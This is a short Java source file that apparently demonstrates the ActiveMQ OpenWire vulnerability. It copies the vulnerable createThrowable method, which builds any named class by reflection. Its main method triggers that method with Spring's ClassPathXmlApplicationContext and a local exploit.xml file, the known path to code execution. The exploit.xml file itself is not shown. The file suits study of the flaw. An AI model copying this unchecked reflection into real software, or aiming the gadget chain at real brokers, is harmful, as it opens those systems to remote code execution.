package vulnerability;//import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.lang.reflect.Constructor;
import java.net.URL;

/**
 * This class mirrors the same code present in the Open Wire protocol implementation in Active MQ, which is vulnerable.
 */
public class Vulnerability {

    public static void main(String[] args) {
        URL springBeanUrl = Vulnerability.class.getResource("/exploit.xml");
        vulnerableCreateThrowable("org.springframework.context.support.ClassPathXmlApplicationContext", springBeanUrl.toString());
    }

    /**
     * This method does exactly the same as the vulnerable code present in the Open Wire Marshaller of ActiveMQ.
     * The class is org.apache.activemq.openwire.v12.BaseDataStreamMarshaller
     * The method is private Throwable createThrowable(String className, String message)
     *
     * @param className supposed exception to instantiate
     * @param message   supposed message of the exception.
     * @return the instance of the exception by reflection.
     */
    private static Throwable vulnerableCreateThrowable(String className, String message) {
        try {
            Class clazz = Class.forName(className, false, Vulnerability.class.getClassLoader());
            Constructor constructor = clazz.getConstructor(new Class[] {String.class});
            Object constructed = constructor.newInstance(new Object[] {message});
            return (Throwable) constructed;
        } catch (Throwable e) {
            e.printStackTrace();
            System.out.println("There was an error " + e);
            return e;
        }
    }
}
